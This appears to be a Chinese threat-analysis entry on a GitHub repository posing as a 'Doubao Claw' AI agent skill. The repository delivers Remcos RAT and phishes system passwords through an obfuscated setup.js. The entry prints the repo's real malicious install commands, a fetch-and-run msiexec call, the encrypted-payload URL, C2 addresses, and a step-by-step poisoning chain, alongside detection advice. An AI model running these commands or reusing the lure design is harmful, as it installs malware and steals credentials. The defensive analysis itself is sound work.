---
id: ai-security-supply-chain-doubao-claw-fake-skill-setup-js-remcos
title: 伪装豆包 Claw 的恶意 Agent Skill 项目：setup.js 假安装、窃取系统密码并投递 Remcos
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: fake-agent-skill-setup-js-password-theft-remcos
aliases:
- 豆包 Claw 恶意项目
- Doubao-Claw
- Heartflabrace
- 假 Agent Skill
- setup.js 恶意脚本
- cloudcraftshub
- trackpipe.dev
- GHOST_PASSWORD_ONLY
tags:
- ai-supply-chain
- agent-skill
- github
- malicious-repo
- setup-js
- javascript-obfuscation
- credential-theft
- remcos
- windows
- macos
- initial-access
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V99
  verified_at: '2026-11-05T20:13:49+08:00'
  notes: 已对照原文 content.md（288行）与全部39张图片核对：仓库/README/SKILL.md 的 msiexec 一键安装命令、install.sh 末尾 GHOST_PASSWORD_ONLY=1 node scripts/setup.js、setup.js MD5 与假安装界面/进度条、promptPassword 三平台提示与 maxAttempts=5、preparePayload 从 trackpipe.dev/t/bootstrap?t=8d2c6bee-... 取 p/k 并按 IV16+authTag16+密文 用 aes-256-gcm 解密写入 sys-opt-<hex>.js、launchPayload 环境变量与 60s unlink、3 次重试 2-22s、macOS Full Disk Access osascript 弹窗与 x-apple.systempreferences...Privacy_AllFiles、IOC 均与图片一致。已修正：图01 为 Google 搜索，原文表述改为“搜索引擎搜索”而非“GitHub 搜索”。未验证点：GHOST_PASSWORD_ONLY=1“仅密码模式、跳过载荷执行”来自图14 AI 解混淆摘要，原始代码未直接展示；dscl/PowerShell ValidateCredentials/su 亦来自该摘要而非原始代码截图；原文未给组件受影响版本，未设 affected_versions；frontmatter 无 sources/source_url；恶意样本未在本机运行。
---

## 一句话结论

GitHub 仓库 `Heartflabrace/Doubao-Claw` 冒充“豆包 Claw”AI 工具包，README/SKILL.md 中的 Windows 安装命令实际从 `https://cloudcraftshub.com/api` 拉取 MSI，`install.sh` 则运行经过混淆的 `scripts/setup.js`；setup.js 打印假安装进度、弹出“Keychain 授权”提示并校验用户输入的系统密码（macOS `dscl -authonly` / Windows PowerShell `ValidateCredentials` / Linux `su`），再从 `trackpipe.dev` 下载 AES-256-GCM 加密载荷写入临时目录并拉起，macOS 上还诱导用户授予“完全磁盘访问”；MSI 释放带签名的 GoToMeeting `G2M.exe` 与恶意 `g2m.dll`，侧加载后最终在内存中运行 Remcos RAT。

## 原理

- **伪装形态**：仓库对外是一个完整的 AI 工具包（Rust CLI `dbclaw`、TypeScript SDK、Rust crate、MIT License、README、SKILL.md），搜索引擎搜索“Doubao Claw”可命中（图01 为 Google 搜索）；项目在 2026-03-04 至 03-13 多次更新恶意脚本，说明作者在持续维护投毒链。README/SKILL.md 里的“一键安装”降低了用户审查安装脚本的意愿。
- **Windows 一键安装即投毒**：README/SKILL.md 让用户在 cmd 中执行 `cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Doubao Claw`；该 URL 返回 MSI（原文抓到 `dropras.msi` 644KB，VT 37/61 报毒），静默安装后进入白加黑链路（见 [[pentest-c2-msi-g2m-dll-sideload-etw-patch-memory-pe-remcos]]）。
- **macOS/Linux 的 install.sh**：脚本检查/安装 Node.js（版本低于 10 时重新安装）、执行 `npm install`，最后以 `GHOST_PASSWORD_ONLY=1 node scripts/setup.js` 运行恶意脚本；`GHOST_PASSWORD_ONLY=1` 是“仅密码模式”，跳过后面的载荷执行，只收集密码。
- **setup.js 混淆**：脚本约 75KB，使用字符串数组 + IIFE 旋转、`_0x562dc3(0x551,'!X#@')` 形式的解码函数、`_0xdd2584['JfdXs']` 形式的间接调用、十六进制算术、字符串拼接和控制流平坦化；原文用 AI 辅助还原出 `preparePayload`、`promptPassword`、`launchPayload`、`promptMacFullDiskAccess` 等函数。
- **伪造安装界面**：`main()` 打印 `Doubao Claw SDK`、`v1.5.14 | Doubao Claw Integration Suite`、`Copyright (c) 2026 Doubao Claw, Inc.`，根据 `os.platform()` 显示 macOS/Windows/Linux，调用 `realisticProgressBar` 以随机延迟模拟真实安装进度；这些输出让用户以为在安装正常 SDK。
- **窃取系统密码**：`promptPassword(username, platform)` 用 readline 弹出 `Password:` / `Password for <user>:` / `[sudo] password for <user>:`，最多尝试 5 次；`validatePassword` 分别调用 macOS `dscl -authonly`、Windows PowerShell `ValidateCredentials`、Linux `su` 验证密码，验证通过后把密码作为 `NODE_AUTH_TOKEN` 传给后续 payload。真正的安装器不会向用户索要系统登录密码，这是关键破绽。
- **下载并执行加密载荷**：`preparePayload()` 请求 `https://trackpipe.dev/t/bootstrap?t=8d2c6bee-27ce-4943-9616-4ed17fe0fa04`，取回 JSON 的 `p`（Base64 密文）与 `k`（十六进制密钥）；前 16 字节为 IV、接下来 16 字节为 GCM authTag、其余为密文，用 `aes-256-gcm` 解密后写入系统临时目录的 `sys-opt-<6字节hex>.js`；`launchPayload` 用 `node <scriptPath>` 拉起子进程，环境变量携带 `NODE_AUTH_TOKEN`、`NODE_CHANNEL`、`NPM_CONFIG_TAG`，60 秒后 `unlink` 临时脚本，失败重试 3 次并加入 2–22 秒随机延迟。
- **诱骗 macOS 完全磁盘访问**：`hasSafariLibraryAccess()` 以能否读取 `~/Library/Safari` 作为“完全磁盘访问”的代理判断；若不可读，`promptMacFullDiskAccess()` 用 `osascript` 弹出伪造的“Doubao Claw SDK requires Full Disk Access to securely manage wallet credentials and protect your keychain data”对话框，提供 Skip / Open Settings，点击 Open Settings 会打开 `x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles`，引导用户把终端/IDE 加入完全磁盘访问，便于后续窃取敏感文件。
- **为什么危险**：攻击面不是 AI 模型漏洞，而是“用户信任 AI 工具/Agent Skill 仓库并直接执行安装命令”。攻击者同时覆盖 Windows（MSI 白加黑 → Remcos）与 macOS/Linux（密码 + 加密载荷 + 磁盘权限），项目仍在活跃更新；密码一旦交给脚本，攻击者可复用其登录系统、解密 Keychain 或进一步横向。

## 触发条件

- 用户通过搜索引擎/GitHub 找到 `Doubao-Claw` 项目，按 README/SKILL.md 直接执行一键安装命令或 `install.sh`，未先审查脚本。
- 系统有 Node.js（或脚本自动安装 Node.js）；能访问 `cloudcraftshub.com`、`trackpipe.dev`；Windows 允许运行 MSI，macOS 允许运行 `osascript`/终端。
- 用户在“Keychain 授权/安装需要”话术下输入真实系统密码；macOS 用户进一步授予完全磁盘访问。
- 目标未部署应用白名单/MDM 限制、未拦截未知 GitHub 项目安装脚本，EDR 未对 MSI 落地/白加黑加载告警。

## 利用步骤

（按攻击链/分析顺序描述，非本机复现。）

1. **投毒仓库**：创建仿真 AI 工具包（CLI/SDK/SKILL.md/MIT 许可），在 README 与 SKILL.md 中放置一键安装命令；用正常代码掩盖恶意 `install.sh`/`scripts/setup.js`。
2. **Windows 链路**：用户执行 `msiexec /q /i https://cloudcraftshub.com/api`，静默安装 `dropras.msi`；MSI 在 `%APPDATA%\GoToMeeting\` 释放签名 `G2M.exe` 与恶意 `g2m.dll`，运行 G2M.exe 后侧加载并执行 Remcos。
3. **macOS/Linux 链路**：`install.sh` 安装依赖后执行 `GHOST_PASSWORD_ONLY=1 node scripts/setup.js`；setup.js 显示假 SDK 安装界面与进度条。
4. **骗取密码**：脚本提示需要 Keychain 授权/管理员权限，要求输入系统密码；用 dscl/PowerShell/su 验证后把密码保存为 `NODE_AUTH_TOKEN`。
5. **投递二阶段**：从 `trackpipe.dev` 拉取 AES-256-GCM 加密的 JS 载荷，解密到临时目录并 `node` 执行；60 秒后删除临时文件。
6. **提权/扩权**：macOS 上检测 `~/Library/Safari` 可读性，弹窗诱导用户把终端加入完全磁盘访问；Windows 上由 MSI 链路进入 Remcos。
7. **验证/分析**：克隆仓库检查 `install.sh` 与 `setup.js`；AI 辅助解混淆后定位 `preparePayload`/`promptPassword`/`launchPayload`；抓包确认 `cloudcraftshub.com` 与 `trackpipe.dev`；对 MSI 做静态/动态分析。

## PoC

原文为恶意项目分析，无攻击 PoC；关键命令与 IOC 如下（未在本机执行）：

```bash
# 仓库中的恶意安装入口（Windows）
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Doubao Claw

# install.sh 末尾的恶意调用
GHOST_PASSWORD_ONLY=1 node scripts/setup.js

# 二阶段下载（sessionId 固定）
https://trackpipe.dev/t/bootstrap?t=8d2c6bee-27ce-4943-9616-4ed17fe0fa04
```

```text
IOC:
repo      https://github.com/Heartflabrace/Doubao-Claw
MSI       https://cloudcraftshub.com/api  (dropras.msi, MD5 EA3C7C9C8B001DD1B7D58239003945FA)
setup.js  MD5 0BCAF3808C9FE1646B1C143D866640D1
g2m.dll   MD5 8D1F08C28125E93BC4128BB803FDFCF4
Remcos C2 146.19.24.131:2404 (波兰华沙)
```

## 变体与关联

- **同类投毒载体**：伪装成 AI Agent Skill/CLI/SDK 的 GitHub 仓库、npm/PyPI 包、VS Code/Cursor 插件、模型仓库脚本；与 [[ai-security-supply-chain-ai-codegen-prompt-npm-install-rce]]、[[ai-security-supply-chain-python-pth-addsitedir-model-disguise]]、[[ai-security-supply-chain-vllm-auto-map-trust-remote-code-bypass]] 同属 AI 供应链信任滥用。
- **安装器变体**：README 一键 `curl | bash`、`msiexec /i URL`、伪造安装包下载页、GitHub Release 附件、安装脚本中途索要系统密码、假 Keychain/Full Disk Access 授权。
- **载荷变体**：AES-GCM/Base64 加密的 Node.js 脚本、临时目录自删除、环境变量传递凭据；Windows 侧 MSI 白加黑 → 内存 PE → Remcos，详见 [[pentest-c2-msi-g2m-dll-sideload-etw-patch-memory-pe-remcos]]。
- **边界**：需要用户执行安装命令并输入密码；Node.js 缺失时脚本会尝试安装；网络域名可能被下线/更换；macOS 完全磁盘访问需用户手动授权；Windows MSI 可能被 SmartScreen/EDR 拦截。

## 检测与防御

- **供应链审查**：不要直接执行 GitHub 项目 README 中的一键安装命令；核对仓库作者、star/历史、release 签名与官网来源；审查 `install.sh`、`setup.js`、`package.json` 的 `postinstall`，警惕安装脚本索要系统密码或请求完全磁盘访问。
- **终端防护**：用沙箱/虚拟机验证新工具；Windows 用 AppLocker/WDAC 限制 MSI 与未签名 DLL；macOS 限制终端完全磁盘访问、监控 `osascript` 弹窗与 `Privacy_AllFiles` 设置变更；Linux 监控 `su` 调用与临时 `sys-opt-*.js`。
- **网络检测**：封禁/告警 `cloudcraftshub.com`、`trackpipe.dev` 及 Remcos C2 `146.19.24.131:2404`；监控从临时目录运行的 `node sys-opt-*.js`、安装器进程访问未知域名。
- **主机检测**：`%APPDATA%\GoToMeeting\G2M.exe`/`g2m.dll` 同时出现且 DLL 无签名；G2M.exe 加载本地未签名 DLL；`Global\ChromiumUpdater_ca892h` 互斥体；`EtwEventWrite` 首字节被改；Remcos RCDATA `SETTINGS` 配置与 C2。
- **响应**：立即断网、修改系统密码/Keychain 密码、撤销会话与令牌、检查完全磁盘访问授权列表、清除持久化与 C2、对同仓库下载的其他工具做排查。
